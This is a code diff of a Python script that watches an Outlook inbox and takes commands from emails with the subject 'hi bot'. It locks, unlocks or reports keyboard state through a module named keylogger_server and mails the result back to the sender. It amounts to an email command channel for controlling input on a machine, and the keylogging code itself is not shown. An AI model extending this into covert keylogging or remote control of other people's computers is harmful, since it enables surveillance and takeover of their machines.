@@ -17,11 +17,25 @@ def sendBack(subject,body,sendTo):
 
 def listen(msg):
     global islock
-    string = msg.lower()
+    string = msg.lower().strip().split()
     rep = ""
-    if "keyboard" in string:
-        rep,islock = keylogger_server.keylog(msg,islock)
-
+    if "mapi" == string[0]:
+        if "keyboard" == string[1]:
+            if "lock" == string[2]:
+                if islock == 1:
+                    rep = "The keyboard state is block"
+                else:
+                    rep, islock = keylogger_server.keylog(msg,islock)
+            elif "unlock" == string[2]:
+                if islock == 0:
+                    rep = "The keyboard state is unblock"
+                else:
+                    rep, islock = keylogger_server.keylog(msg, islock)
+            elif "state" == string[2]:
+                if islock == 1:
+                    rep = "The keyboard state is block"
+                else:
+                    rep = "The keyboard state is unblock"
     return rep
 
 inbox = outlook.GetDefaultFolder(6)
@@ -31,11 +45,12 @@ mailDefault = messages.GetLast()
 while True:
     mailNow = messages.GetLast()
     if( mailNow.ReceivedTime > mailDefault.ReceivedTime ):
-        rep = listen(mailNow.Body)
-        print(rep)
-        sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
-        mailDefault = mailNow
-        print(True)
+        if( "hi bot" in mailNow.subject.lower()):
+            rep = listen(mailNow.Body)
+            print(rep)
+            sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
+            mailDefault = mailNow
+            print(True)
     else:
         print(False)
 
